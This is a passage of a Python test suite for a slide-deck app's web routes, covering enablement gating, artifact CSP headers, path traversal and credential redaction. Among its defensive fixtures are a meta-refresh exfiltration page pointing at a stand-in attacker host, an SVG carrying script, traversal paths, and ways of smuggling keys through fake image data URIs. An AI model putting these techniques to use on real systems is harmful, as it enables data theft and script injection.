"""Route-layer tests: authorization, artifact serving, and input validation.

Lives in the repo-level ``test/`` tree (not the app's in-package ``tests/``)
because ``setup.cfg`` sets ``testpaths = test transfer`` — a test under
``src/kiro_crew/apps/builtins/...`` is never collected by CI.

Four things are pinned here because each is a way the app could be wrong in a
way no other test would catch:

* **Deny-by-default.** Routes are registered once at gateway startup, so a
  default-disabled app stays callable unless every handler checks enablement.
* **The served-artifact allow-list.** Deck contents are model-influenced, so only
  the extensions the viewer renders may be handed to a browser.
* **Redaction of agent-authored text, and byte-identity of binaries.** Both
  directions are load-bearing and both fail silently: an unredacted `.json`
  leaks a credential into the dashboard, while a redacted `.pptx` is a corrupt
  deck that still looks like a successful download.
* **``PUT /config`` key equality.** The endpoint writes into the ENGINE's own
  config file; merging arbitrary keys would let a browser request set any engine
  option.

Uses aiohttp's ``AioHTTPTestCase`` against the real ``register_routes``, with the
blocking layer's inputs faked at the filesystem rather than mocked away.
"""

import asyncio
import base64
import json
import os
import random
import shutil
import tempfile
import unittest
import zipfile
from pathlib import Path
from typing import Callable
from unittest import mock

from aiohttp import web
from aiohttp.test_utils import AioHTTPTestCase

from conftest import make_dir_link
from kiro_crew.apps.builtins.pptx_maker.backend import engine, paths, provision, routes

# An AKIA-shaped access key ID. The canonical AWS documentation example, so it is
# a real pattern match without being a live secret.
_FAKE_AKIA = "AKIAIOSFODNN7EXAMPLE"

# Verified clean against `_ENCODED_CREDENTIAL_RE` at every size used below.
_RASTER_SEED = 20260803


def _raster_body(size: int) -> bytes:
    """`size` bytes of high-entropy but DETERMINISTIC raster payload.

    These tests assert a genuine raster is *exempted* from redaction, which needs its
    base64 body to carry no credential pattern. `os.urandom` cannot promise that, and
    it used to be actively likely: `_ENCODED_CREDENTIAL_RE` matched the BARE prefixes
    `xox[abposr]` and `sk-ant`, which random base64 produced ~1.07% of the time per
    20 KB (measured 32/3000), making two of these the 3rd and 4th most frequent CI
    failures. Every alternative now requires its separator (`-`/`_`), which base64
    cannot contain, so a chance match is no longer possible — but a fixed seed is
    still the right fixture: it keeps the payload high-entropy, which is the property
    under test since it is what makes the bare-secret heuristic fire, while fixing the
    outcome on every host.
    """
    return random.Random(_RASTER_SEED).randbytes(size)


def _enabled(value: bool):
    """Patch the app-enablement gate the ``_require_enabled`` wrapper consults."""
    return mock.patch.object(routes, "is_app_enabled", return_value=value)


class _RoutesFixture(AioHTTPTestCase):
    """A live aiohttp app with the real routes and a temp deck root."""

    async def get_application(self) -> web.Application:
        app = web.Application()
        routes.register_routes(app)
        return app

    async def asyncSetUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp())
        self.root = self.tmp / "decks"
        self.deck = self.root / "20260101-demo"
        (self.deck / "specs").mkdir(parents=True)
        (self.deck / "specs" / "brief.md").write_text("the brief", encoding="utf-8")
        (self.deck / "compose").mkdir()
        (self.deck / "compose" / "intro_1.json").write_text("{}", encoding="utf-8")
        (self.deck / "output.pptx").write_bytes(b"PK\x03\x04")
        self._prev_root = os.environ.get(paths.DECK_ROOT_ENV)
        os.environ[paths.DECK_ROOT_ENV] = str(self.root)
        await super().asyncSetUp()

    async def asyncTearDown(self) -> None:
        await super().asyncTearDown()
        if self._prev_root is None:
            os.environ.pop(paths.DECK_ROOT_ENV, None)
        else:
            os.environ[paths.DECK_ROOT_ENV] = self._prev_root
        shutil.rmtree(self.tmp, ignore_errors=True)

    def url(self, path: str) -> str:
        return f"{routes.API_PREFIX}{path}"


class TestDenyByDefault(_RoutesFixture):
    """Every route must refuse while the app is disabled. Routes are registered
    at gateway startup regardless of enablement, so this wrapper is the ONLY
    thing standing between a disabled app and a live endpoint."""

    _READ_ROUTES = (
        "/engine",
        "/deps",
        "/assets",
        "/config",
        "/decks",
        "/deck?id=20260101-demo",
        "/styles",
        "/style?name=x",
        "/templates",
        "/preview/20260101-demo/specs/brief.md",
    )

    async def test_every_get_route_is_403_when_disabled(self) -> None:
        with _enabled(False):
            for path in self._READ_ROUTES:
                resp = await self.client.get(self.url(path))
                self.assertEqual(resp.status, 403, path)

    async def test_mutating_routes_are_403_when_disabled(self) -> None:
        with _enabled(False):
            for method, path in (
                ("post", "/engine/provision"),
                ("post", "/assets/provision"),
                ("put", "/config"),
                ("post", "/styles/import?name=x"),
                ("post", "/styles/rename"),
                ("post", "/styles/pin"),
                ("delete", "/styles?name=x"),
                ("post", "/templates/import?name=x"),
                ("post", "/templates/rename"),
                ("delete", "/templates?name=x"),
            ):
                resp = await getattr(self.client, method)(self.url(path), json={})
                self.assertEqual(resp.status, 403, f"{method} {path}")

    async def test_a_disabled_app_never_touches_the_filesystem(self) -> None:
        # The gate must run BEFORE the handler body, or a disabled app still
        # walks the deck tree on every poll.
        with _enabled(False), mock.patch.object(routes.decks, "list_decks") as listing:
            resp = await self.client.get(self.url("/decks"))
        self.assertEqual(resp.status, 403)
        listing.assert_not_called()


class TestDecksRoutes(_RoutesFixture):
    async def test_deck_list(self) -> None:
        with _enabled(True):
            resp = await self.client.get(self.url("/decks"))
        self.assertEqual(resp.status, 200)
        body = await resp.json()
        self.assertEqual([d["deckId"] for d in body["decks"]], ["20260101-demo"])

    async def test_deck_detail(self) -> None:
        with _enabled(True):
            resp = await self.client.get(self.url("/deck?id=20260101-demo"))
        self.assertEqual(resp.status, 200)
        body = await resp.json()
        self.assertEqual(body["deckId"], "20260101-demo")
        self.assertIn("brief", body["specs"])

    async def test_deck_detail_requires_an_id(self) -> None:
        with _enabled(True):
            resp = await self.client.get(self.url("/deck"))
        self.assertEqual(resp.status, 400)

    async def test_unknown_deck_is_404(self) -> None:
        with _enabled(True):
            resp = await self.client.get(self.url("/deck?id=nope"))
        self.assertEqual(resp.status, 404)


class TestPreviewRoute(_RoutesFixture):
    async def test_serves_a_markdown_deliverable(self) -> None:
        with _enabled(True):
            resp = await self.client.get(self.url("/preview/20260101-demo/specs/brief.md"))
        self.assertEqual(resp.status, 200)
        self.assertEqual(resp.headers["Content-Type"].split(";")[0], "text/markdown")
        self.assertEqual(resp.headers["Cache-Control"], routes.NO_STORE)
        self.assertEqual(resp.headers["X-Content-Type-Options"], "nosniff")
        self.assertEqual(await resp.text(), "the brief")

    async def test_serves_a_compose_payload_as_json(self) -> None:
        with _enabled(True):
            resp = await self.client.get(self.url("/preview/20260101-demo/compose/intro_1.json"))
        self.assertEqual(resp.status, 200)
        self.assertEqual(resp.headers["Content-Type"].split(";")[0], "application/json")

    async def test_html_artifact_carries_a_restrictive_csp(self) -> None:
        """The art-direction board is author-controlled markup. The frontend
        sandboxes it in an iframe, and this CSP means a DIRECT navigation to the
        URL cannot execute script against the dashboard origin either."""
        (self.deck / "specs" / "art-direction.html").write_text(
            "<html><body>board</body></html>", encoding="utf-8"
        )
        with _enabled(True):
            resp = await self.client.get(
                self.url("/preview/20260101-demo/specs/art-direction.html")
            )
        self.assertEqual(resp.status, 200)
        self.assertIn("default-src 'none'", resp.headers["Content-Security-Policy"])

    async def test_the_csp_also_blocks_self_navigation(self) -> None:
        """`default-src 'none'` does NOT cover navigation, so `sandbox` is required.

        The fetch directives bound sub-resources; navigation has no CSP directive
        constraining it — `form-action` is form submission only and `navigate-to` never
        shipped. So `<meta http-equiv="refresh" content="0;url=https://attacker/?d=…">`
        in an agent-written board navigated the tab on its own the moment the user
        followed the preview link, carrying whatever the model put in the URL, while
        `default-src 'none'` blocked every fetch and none of that.

        Asserted as a distinct test rather than another `assertIn` on the one above,
        because the two directives defend different things: dropping `sandbox` would
        leave that test green and this exfiltration channel open.
        """
        (self.deck / "specs" / "art-direction.html").write_text(
            '<html><head><meta http-equiv="refresh" '
            'content="0;url=https://attacker.invalid/?d=leak"></head></html>',
            encoding="utf-8",
        )
        with _enabled(True):
            resp = await self.client.get(
                self.url("/preview/20260101-demo/specs/art-direction.html")
            )
        self.assertEqual(resp.status, 200)
        csp = resp.headers["Content-Security-Policy"]
        directives = {d.strip().split(" ")[0] for d in csp.split(";") if d.strip()}
        self.assertIn("sandbox", directives, "a meta-refresh can navigate the tab off-origin")
        # Empty value: any `allow-top-navigation*` token would reopen exactly this.
        self.assertNotIn("allow-top-navigation", csp)

    async def test_svg_artifact_carries_the_same_restrictive_csp(self) -> None:
        """An SVG is a DOCUMENT, not passive media — it can carry `<script>`.

        And `nosniff` does not help, because `image/svg+xml` is the correct label.
        Served with only the dashboard's base CSP (`script-src 'self'
        'unsafe-inline'`), navigating to the artifact ran agent-authored script on
        the dashboard origin with the session cookie. The path is reachable: the
        composer agent writes the file AND a link to it in `specs/brief.md`, which
        the frontend renders as a real anchor.
        """
        (self.deck / "diagram.svg").write_text(
            '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("/api/x")</script></svg>',
            encoding="utf-8",
        )
        with _enabled(True):
            resp = await self.client.get(self.url("/preview/20260101-demo/diagram.svg"))
        self.assertEqual(resp.status, 200)
        self.assertIn("default-src 'none'", resp.headers["Content-Security-Policy"])

    async def test_every_script_capable_served_type_gets_the_restrictive_csp(self) -> None:
        """Derived from `SERVED_SUFFIXES`, so a new suffix cannot slip through.

        The `.svg` hole existed because the CSP branch named ONE content type while
        the allow-list carried two script-capable ones. Asserting the relationship
        rather than the two known cases is what makes that un-repeatable.
        """
        script_capable = {
            suffix: served
            for suffix, served in routes.SERVED_SUFFIXES.items()
            if served.content_type.startswith(("text/html", "image/svg+xml"))
        }
        self.assertTrue(script_capable, "no script-capable suffix found — check the fixture")
        for suffix, served in script_capable.items():
            self.assertTrue(
                served.content_type.startswith(routes._SCRIPT_CAPABLE_CONTENT_TYPES),
                f"{suffix} ({served.content_type}) is a script-capable document but "
                "would not receive _ARTIFACT_HTML_CSP",
            )

    async def test_extension_not_on_the_allow_list_is_404(self) -> None:
        # Deck contents are model-influenced, so an unexpected extension must not
        # be handed to a browser even though it sits inside the deck.
        (self.deck / "notes.txt").write_text("plain", encoding="utf-8")
        (self.deck / "script.js").write_text("alert(1)", encoding="utf-8")
        with _enabled(True):
            for name in ("notes.txt", "script.js"):
                resp = await self.client.get(self.url(f"/preview/20260101-demo/{name}"))
                self.assertEqual(resp.status, 404, name)

    async def test_traversal_is_404(self) -> None:
        (self.tmp / "secret.md").write_text("secret", encoding="utf-8")
        with _enabled(True):
            for subpath in ("../secret.md", "specs/../../secret.md", "..%2Fsecret.md"):
                resp = await self.client.get(self.url(f"/preview/20260101-demo/{subpath}"))
                self.assertEqual(resp.status, 404, subpath)
                self.assertNotIn("secret", await resp.text())

    async def test_unknown_deck_is_404(self) -> None:
        with _enabled(True):
            resp = await self.client.get(self.url("/preview/other/specs/brief.md"))
        self.assertEqual(resp.status, 404)

    async def test_oversized_artifact_is_refused(self) -> None:
        with _enabled(True), mock.patch.object(routes, "MAX_ARTIFACT_BYTES", 2):
            resp = await self.client.get(self.url("/preview/20260101-demo/specs/brief.md"))
        self.assertEqual(resp.status, 404)


class TestPreviewRedaction(_RoutesFixture):
    """Agent-authored artifact text must be redacted on its way to the browser.

    Every textual artifact this route serves is written by the presentation-engine
    agent from model output, so a credential the model echoed into a brief, an
    outline or a compose payload would otherwise reach the dashboard verbatim.
    ``decks.py`` already redacts the deck NAME and the brief PREVIEW, so serving
    the same file's full contents raw was an inconsistent hole rather than a
    deliberate exemption.

    Both directions are pinned, because both fail silently:
    * a missing redaction leaks the credential, and
    * an over-eager one corrupts a `.pptx` (a zip) or a `.png` while still looking
      like a successful download.
    """

    async def _preview(self, subpath: str):
        with _enabled(True):
            return await self.client.get(self.url(f"/preview/20260101-demo/{subpath}"))

    async def test_a_credential_in_a_served_json_is_redacted(self) -> None:
        (self.deck / "compose" / "intro_1.json").write_text(
            json.dumps({"components": [{"text": f"deploy with {_FAKE_AKIA}"}]}),
            encoding="utf-8",
        )
        resp = await self._preview("compose/intro_1.json")
        self.assertEqual(resp.status, 200)
        body = await resp.text()
        self.assertNotIn(_FAKE_AKIA, body)
        self.assertIn("REDACTED", body)
        # Still parseable JSON: the redactor substitutes inside the string value,
        # so the viewer's `fetchArtifactJson` must not start throwing.
        self.assertEqual(
            json.loads(body)["components"][0]["text"], "deploy with [REDACTED: credential]"
        )

    async def test_a_credential_in_a_served_markdown_is_redacted(self) -> None:
        (self.deck / "specs" / "brief.md").write_text(
            f"# Brief\n\nUse key {_FAKE_AKIA} for the demo.\n", encoding="utf-8"
        )
        resp = await self._preview("specs/brief.md")
        self.assertEqual(resp.status, 200)
        body = await resp.text()
        self.assertNotIn(_FAKE_AKIA, body)
        self.assertIn("REDACTED", body)
        # The surrounding prose survives — this is a redaction, not a rejection.
        self.assertIn("# Brief", body)

    async def test_a_credential_in_a_served_svg_is_redacted(self) -> None:
        (self.deck / "diagram.svg").write_text(
            f'<svg xmlns="http://www.w3.org/2000/svg"><text>{_FAKE_AKIA}</text></svg>',
            encoding="utf-8",
        )
        resp = await self._preview("diagram.svg")
        self.assertEqual(resp.status, 200)
        body = await resp.text()
        self.assertNotIn(_FAKE_AKIA, body)
        self.assertIn("<svg", body)

    async def test_a_credential_in_a_served_html_board_is_redacted(self) -> None:
        (self.deck / "specs" / "art-direction.html").write_text(
            f"<html><body>token {_FAKE_AKIA}</body></html>", encoding="utf-8"
        )
        resp = await self._preview("specs/art-direction.html")
        self.assertEqual(resp.status, 200)
        self.assertNotIn(_FAKE_AKIA, await resp.text())

    async def test_a_pptx_is_served_byte_identical(self) -> None:
        """The false-negative guard: a `.pptx` is a ZIP, so redacting a byte
        inside it produces a deck the user cannot open. Built as a real zip whose
        compressed stream contains a credential — proving the binary leg is chosen
        by SUFFIX and never by inspecting content."""
        pptx = self.deck / "output.pptx"
        with zipfile.ZipFile(pptx, "w") as zf:
            zf.writestr("ppt/slides/slide1.xml", f"<p>{_FAKE_AKIA}</p>" * 40)
        original = pptx.read_bytes()
        resp = await self._preview("output.pptx")
        self.assertEqual(resp.status, 200)
        self.assertEqual(await resp.read(), original)
        # And it is still a readable zip after the round trip.
        self.assertTrue(zipfile.is_zipfile(pptx))

    async def test_a_png_is_served_byte_identical(self) -> None:
        """Same guard for a bitmap: a PNG's compressed bytes routinely contain
        long base64-alphabet-looking runs, and rewriting one corrupts the image."""
        png = self.deck / "preview"
        png.mkdir()
        raw = b"\x89PNG\r\n\x1a\n" + _raster_body(4096)
        (png / "page1-x.png").write_bytes(raw)
        resp = await self._preview("preview/page1-x.png")
        self.assertEqual(resp.status, 200)
        self.assertEqual(await resp.read(), raw)

    async def test_an_undecodable_text_artifact_does_not_raise(self) -> None:
        """Degrade, never crash. The decode happens on a worker thread, so an
        escaping UnicodeDecodeError would surface as an opaque 500 rather than the
        artifact the user asked for."""
        (self.deck / "specs" / "brief.md").write_bytes(
            b"valid \xff\xfe\x80 bytes " + _FAKE_AKIA.encode()
        )
        resp = await self._preview("specs/brief.md")
        self.assertEqual(resp.status, 200)
        body = await resp.text()
        self.assertNotIn(_FAKE_AKIA, body)
        self.assertIn("valid", body)

    async def test_inline_raster_art_survives_the_redaction_pass(self) -> None:
        """The other false-negative guard, and the reason `_INLINE_BITMAP_RE`
        exists. The engine re-encodes embedded art as `data:image/webp;base64,…`;
        a random raster always contains a 40-char window of random base64, which
        the bare-secret heuristic redacts. Without the excision this blanks every
        photo in every deck while looking perfectly secure."""
        # A real WebP header, then random compressed-image bytes — which is what
        # makes the bare-secret heuristic fire without the excision.
        webp = b"RIFF" + (20 * 1024).to_bytes(4, "little") + b"WEBP"
        raster = base64.b64encode(webp + _raster_body(20 * 1024)).decode()
        (self.deck / "compose" / "intro_1.json").write_text(
            json.dumps(
                {
                    "bgSvg": f'<image href="data:image/webp;base64,{raster}"/>',
                    "notes": f"key {_FAKE_AKIA}",
                }
            ),
            encoding="utf-8",
        )
        resp = await self._preview("compose/intro_1.json")
        self.assertEqual(resp.status, 200)
        payload = json.loads(await resp.text())
        # The image is intact...
        self.assertIn(raster, payload["bgSvg"])
        # ...and the credential OUTSIDE it was still redacted.
        self.assertNotIn(_FAKE_AKIA, payload["notes"])

    async def test_a_fake_bitmap_data_uri_cannot_smuggle_a_credential(self) -> None:
        """The `data:image/...` label is written by the same agent as the rest of
        the artifact, so it is a CLAIM, not a fact. Excising on the label alone
        would make the bitmap carve-out a smuggling channel: `AKIA…` is entirely
        base64-alphabet, so a model could wrap a key in a fake bitmap URI and skip
        the scanner. Only a blob whose decoded bytes really start with a raster
        signature is excised."""
        for subtype in ("png", "webp", "jpeg", "gif", "bmp", "avif"):
            with self.subTest(subtype=subtype):
                (self.deck / "specs" / "brief.md").write_text(
                    f'<image href="data:image/{subtype};base64,{_FAKE_AKIA}"/>',
                    encoding="utf-8",
                )
                resp = await self._preview("specs/brief.md")
                self.assertEqual(resp.status, 200)
                self.assertNotIn(_FAKE_AKIA, await resp.text())

    async def test_every_real_raster_signature_survives(self) -> None:
        """The matching false-negative guard: the magic-number probe must admit
        every format the engine can emit, or that format's images go blank."""
        rasters = {
            "png": b"\x89PNG\r\n\x1a\n",
            "jpeg": b"\xff\xd8\xff\xe0",
            "gif": b"GIF89a",
            "webp": b"RIFF" + (9000).to_bytes(4, "little") + b"WEBP",
            "bmp": b"BM",
            "avif": b"\x00\x00\x00 ftypavif",
        }
        for subtype, magic in rasters.items():
            with self.subTest(subtype=subtype):
                blob = base64.b64encode(magic + _raster_body(9000)).decode()
                (self.deck / "compose" / "intro_1.json").write_text(
                    json.dumps(
                        {
                            "bgSvg": f'<image href="data:image/{subtype};base64,{blob}"/>',
                            "notes": f"key {_FAKE_AKIA}",
                        }
                    ),
                    encoding="utf-8",
                )
                resp = await self._preview("compose/intro_1.json")
                payload = json.loads(await resp.text())
                self.assertIn(blob, payload["bgSvg"])
                self.assertNotIn(_FAKE_AKIA, payload["notes"])

    async def test_a_raster_whose_base64_contains_a_token_prefix_still_renders(
        self,
    ) -> None:
        """A bare `xox…` prefix occurring by chance inside a real raster must not
        blank the image.

        The credential scan used to match `xox[abposr]` as a bare 4-character
        literal against the base64 body — a long run drawn from 64 symbols — so
        chance collisions scaled with image size (measured 0.88% per 20 KB raster,
        4.7% per 100 KB). Every hit silently replaced a legitimate picture with
        `[REDACTED: credential]`, which is the looks-secure-renders-blank failure the
        bitmap carve-out exists to prevent. Requiring the token's `-` separator makes
        it impossible instead of merely unlikely: `-` is not a base64 character.

        `xoxb` is placed on a base64 group boundary so it appears verbatim in the
        encoded body rather than by luck.
        """
        # 8-byte PNG magic + 1 filler = 9 bytes, so the next 3 bytes start a base64
        # group and encode to exactly "xoxb".
        body = (
            b"\x89PNG\r\n\x1a\n"
            + bytes([0x42])
            + base64.b64decode("xoxb")
            + _raster_body(3000)
        )
        blob = base64.b64encode(body).decode()
        self.assertIn("xoxb", blob, "fixture must actually embed the prefix")

        (self.deck / "compose" / "intro_1.json").write_text(
            json.dumps({
                "bgSvg": f'<image href="data:image/png;base64,{blob}"/>',
                "notes": f"key {_FAKE_AKIA}",
            }),
            encoding="utf-8",
        )
        resp = await self._preview("compose/intro_1.json")
        payload = json.loads(await resp.text())
        self.assertIn(blob, payload["bgSvg"])
        self.assertNotIn(_FAKE_AKIA, payload["notes"])

    async def test_appended_tokens_whose_separator_is_not_base64_are_caught(
        self,
    ) -> None:
        """A credential appended to a real raster is excised whatever its separator.

        The body class is base64-only, so `ghp_…` was cut to `ghp` and `sk-ant…` to
        `sk` before the credential scan ran — and both scan alternatives required the
        very character that had been cut, making them unreachable. The adjacent token
        run is now captured separately so the whole token is scanned.

        Both a padding-free and a padded body are covered: without `=` padding the
        decoder consumes appended characters as data and re-encoding reproduces them,
        which is the path that actually serves them.
        """
        # Obviously-synthetic bodies, matching the convention the sibling tests use:
        # a realistically-shaped fixture trips GitHub's push protection.
        tokens = {
            "slack": "xoxb-1234567890-abcdefg",
            "anthropic": "sk-ant-api03-abcdefghijklmnop",
            "github": "ghp_0123456789abcdefghij0123456789abcdef",
            # Matched by this scan but NOT by `redact()` (a real PAT body is 36 chars,
            # so the central redactor ignores this one). It is the case that proves the
            # refusal path must EXCISE rather than hand the region to the text pass.
            "github_short_body": "ghp_0123456789abcdefghij",
            # Markers the credential scan does NOT list. They are caught because the
            # URI does not terminate at the body, not because they were enumerated.
            "pypi": "pypi-AgEIcHlwaS5vcmcCJDAwMDAwMDAwLTAwMDAtMDAwMC0wMDAw",
            "gitlab": "glpat-0123456789abcdefghij",
            "jwt": (
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
                ".eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVP-mB92K27uhbUJU1p1r"
            ),
            "aws": _FAKE_AKIA,
        }
        for filler in (3000, 3001):  # padded vs padding-free base64
            raster = b"\x89PNG\r\n\x1a\n" + _raster_body(filler)
            blob = base64.b64encode(raster).decode()
            for name, token in tokens.items():
                with self.subTest(token=name, filler=filler):
                    (self.deck / "compose" / "intro_1.json").write_text(
                        json.dumps({
                            "bgSvg": (
                                f'<image href="data:image/png;base64,{blob}{token}"/>'
                            ),
                        }),
                        encoding="utf-8",
                    )
                    resp = await self._preview("compose/intro_1.json")
                    self.assertNotIn(token, await resp.text())

    async def test_a_uri_the_body_does_not_terminate_forfeits_the_carve_out(self) -> None:
        """The carve-out is granted only when the URI properly ENDS at the base64.

        A credential appended to the body splits at whatever separator it uses — the
        prefix lands in the BODY and survives the re-encode, while the remainder
        escapes the scan, and the halves reassemble in the served text. Enumerating
        separators is endless (`-`, `_`, a JWT's `.`, `:`, `~`…); enumerating the
        characters that legitimately END a data URI is finite. So anything else
        directly after the body forfeits the exemption. It costs only the inline art of
        an artifact that was already malformed.

        `pypi`, `glpat`, the JWT and the `:`/`~` forms are NOT in
        `_ENCODED_CREDENTIAL_RE` — they are caught by this rule, not by enumeration.
        """
        raster = base64.b64encode(b"\x89PNG\r\n\x1a\n" + _raster_body(3000)).decode()
        appended = {
            "jwt_dot": (
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
                ".eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVP-mB92K27uhbUJU1p1r"
            ),
            "pypi_dash": "pypi-AgEIcHlwaS5vcmcCJDAwMDAwMDAwLTAwMDAtMDAwMC0wMDAw",
            "gitlab_dash": "glpat-0123456789abcdefghij",
            "colon": "svc:0123456789abcdefghijklmn",
            "tilde": "key~0123456789abcdefghijklmn",
            "benign_underscore": "-caption_v2",
        }
        for label, glued in appended.items():
            with self.subTest(appended=label):
                doc = '{"img": "data:image/png;base64,' + raster + glued + '"}'
                out = routes._redact_artifact(doc.encode("utf-8")).decode("utf-8")
                # Assert no substantial FRAGMENT survives, not merely the whole token.
                # Excising only the body left a PyPI macaroon's 49-char tail in the
                # text — the full-token assertion passed while secret material shipped.
                for size in (8,):
                    for i in range(len(glued) - size + 1):
                        self.assertNotIn(glued[i:i + size], out, f"{label} @{i}")
                # The blob is not exempted either, so no half can be reassembled.
                self.assertNotIn(raster, out, label)
                # The terminator is not part of the match, so the document keeps it.
                self.assertTrue(out.rstrip().endswith('"}'), out[-40:])

    async def test_every_legal_uri_terminator_keeps_the_image(self) -> None:
        """The allowlist must admit every shape the engine really emits, or this fix
        becomes the blank-image bug it is meant to remove.

        Each context ends the URI with a different character: a JSON string (`"`), the
        escaped quote a raw JSON file carries (`\\`), CSS `url(...)` and markdown
        `](...)` (`)`), and end-of-text (no character at all).
        """
        blob = base64.b64encode(b"\x89PNG\r\n\x1a\n" + _raster_body(3000)).decode()
        contexts = {
            "json_quote": '{"img": "data:image/png;base64,' + blob + '"}',
            "escaped_quote": json.dumps(
                {"bgSvg": f'<image href="data:image/png;base64,{blob}"/>'}
            ),
            "css_paren": ".x{background:url(data:image/png;base64," + blob + ");}",
            "markdown_paren": "![alt](data:image/png;base64," + blob + ")",
            "end_of_text": "data:image/png;base64," + blob,
        }
        for label, doc in contexts.items():
            with self.subTest(context=label):
                out = routes._redact_artifact(doc.encode("utf-8")).decode("utf-8")
                self.assertEqual(out, doc, label)

    async def test_an_svg_data_uri_is_not_exempted_from_scanning(self) -> None:
        """`image/svg+xml` is deliberately absent from the bitmap subtype list: it
        is a document rather than a bitmap and the engine never emits it, so a
        credential hidden in one must still be scanned."""
        smuggled = base64.b64encode(f"<svg>{_FAKE_AKIA}</svg>".encode()).decode()
        (self.deck / "compose" / "intro_1.json").write_text(
            json.dumps({"bgSvg": f'<image href="data:image/svg+xml;base64,{smuggled}"/>'}),
            encoding="utf-8",
        )
        resp = await self._preview("compose/intro_1.json")
        self.assertEqual(resp.status, 200)
        self.assertNotIn(smuggled, await resp.text())

    async def test_a_forged_bitmap_placeholder_cannot_smuggle_text(self) -> None:
        """The placeholder carries a per-process random nonce, so artifact text
        cannot forge one. A forged token restores to nothing rather than to
        attacker-chosen bytes."""
        forged = "\x00KIROCREW-BITMAP-" + ("0" * 16) + "-0\x00"
        (self.deck / "specs" / "brief.md").write_text(
            f"before{forged}after {_FAKE_AKIA}", encoding="utf-8"
        )
        resp = await self._preview("specs/brief.md")
        self.assertEqual(resp.status, 200)
        body = await resp.text()
        self.assertNotIn(_FAKE_AKIA, body)
        self.assertIn("before", body)
        self.assertIn("after", body)

    async def test_the_declared_content_type_stays_truthful(self) -> None:
        """Redaction re-encodes to UTF-8, so every textual suffix must declare
        `charset=utf-8` — and the response must not carry a stale Content-Length
        computed from the pre-redaction size."""
        (self.deck / "specs" / "brief.md").write_text(
            f"kľúč {_FAKE_AKIA} — ünïcode", encoding="utf-8"
        )
        resp = await self._preview("specs/brief.md")
        self.assertEqual(resp.status, 200)
        self.assertEqual(resp.headers["Content-Type"], "text/markdown; charset=utf-8")
        body = await resp.read()
        self.assertEqual(int(resp.headers["Content-Length"]), len(body))
        self.assertIn("ünïcode", body.decode("utf-8"))


class TestServedSuffixSplit(unittest.TestCase):
    """The text/binary split is what forces a FUTURE suffix to declare its side.

    A new textual extension silently defaulting to "binary, unredacted" would
    re-open the exact hole `_redact_artifact` closes, so the shape of the
    allow-list — not just today's values — is pinned.
    """

    def test_every_entry_declares_its_text_ness(self) -> None:
        for suffix, served in routes.SERVED_SUFFIXES.items():
            self.assertIsInstance(served, routes.ServedSuffix, suffix)
            self.assertIsInstance(served.text, bool, suffix)

    def test_the_known_text_and_binary_suffixes_are_on_the_right_side(self) -> None:
        # Text: agent-authored, so redacted. Binary: compressed containers whose
        # bytes must not be rewritten.
        for suffix in (".json", ".md", ".html", ".svg"):
            self.assertTrue(routes.SERVED_SUFFIXES[suffix].text, suffix)
        for suffix in (".png", ".pptx"):
            self.assertFalse(routes.SERVED_SUFFIXES[suffix].text, suffix)

    def test_a_textual_suffix_declares_a_charset(self) -> None:
        """A text artifact is re-encoded to UTF-8 by the redaction pass, so its
        declared Content-Type has to say so or the browser may guess."""
        for suffix, served in routes.SERVED_SUFFIXES.items():
            if served.text:
                self.assertIn("charset=utf-8", served.content_type, suffix)

    def test_a_served_suffix_cannot_be_built_without_saying_which_side(self) -> None:
        """The constructor requirement IS the forcing function — `text` is not
        defaulted, so adding an entry is a decision rather than an omission."""
        with self.assertRaises(TypeError):
            routes.ServedSuffix("text/plain")  # type: ignore[call-arg]


class TestRedactArtifactHelper(unittest.TestCase):
    """``_redact_artifact`` directly — the point is the transform, not transport."""

    def test_a_credential_is_replaced(self) -> None:
        out = routes._redact_artifact(f"key {_FAKE_AKIA} here".encode())
        self.assertNotIn(_FAKE_AKIA.encode(), out)

    def test_output_is_always_valid_utf8(self) -> None:
        out = routes._redact_artifact(b"\xff\xfe not utf-8 \x80")
        out.decode("utf-8")  # must not raise

    def test_clean_text_is_returned_unchanged(self) -> None:
        """No credential means no rewrite — a redaction pass must not be a
        general-purpose text mangler."""
        original = "# Outline\n\n- [intro] Opening slide\n- [wrap] Closing\n"
        self.assertEqual(routes._redact_artifact(original.encode()).decode("utf-8"), original)

    def test_the_bitmap_probe_rejects_a_body_that_is_not_a_raster(self) -> None:
        self.assertEqual(routes._scanned_bitmap_bytes(_FAKE_AKIA), (None, False))
        self.assertEqual(routes._scanned_bitmap_bytes(""), (None, False))
        self.assertEqual(routes._scanned_bitmap_bytes("!!!not base64!!!"), (None, False))

    def test_the_bitmap_probe_accepts_a_real_raster(self) -> None:
        blob = base64.b64encode(b"\x89PNG\r\n\x1a\n" + _raster_body(64)).decode()
        self.assertIsNotNone(routes._scanned_bitmap_bytes(blob)[0])


class TestConfigRoutes(_RoutesFixture):
    async def test_get_reports_the_resolved_deck_root(self) -> None:
        with _enabled(True):
            resp = await self.client.get(self.url("/config"))
        self.assertEqual(resp.status, 200)
        body = await resp.json()
        self.assertEqual(body["deckRoot"], str(self.root.resolve()))

    async def test_put_rejects_extra_keys(self) -> None:
        """Exact key equality, not a merge: this writes into the ENGINE's config
        file, so accepting extra keys would let a browser request set any engine
        option."""
        with _enabled(True):
            resp = await self.client.put(
                self.url("/config"), json={"deckRoot": "/tmp/x", "output_dir": "/etc"}
            )
        self.assertEqual(resp.status, 400)

    async def test_put_rejects_a_non_object_body(self) -> None:
        with _enabled(True):
            resp = await self.client.put(
                self.url("/config"), data="[1,2]", headers={"Content-Type": "application/json"}
            )
        self.assertEqual(resp.status, 400)

    async def test_put_rejects_invalid_json(self) -> None:
        with _enabled(True):
            resp = await self.client.put(
                self.url("/config"), data="{not json", headers={"Content-Type": "application/json"}
            )
        self.assertEqual(resp.status, 400)

    async def test_put_rejects_a_blank_deck_root(self) -> None:
        with _enabled(True):
            for value in ("", "   ", None, 42):
                resp = await self.client.put(self.url("/config"), json={"deckRoot": value})
                self.assertEqual(resp.status, 400, repr(value))

    async def test_put_writes_into_the_engine_config(self) -> None:
        target = self.tmp / "cfg" / "sdpm" / "config.json"
        with _enabled(True), mock.patch.object(paths, "engine_config_path", return_value=target):
            resp = await self.client.put(
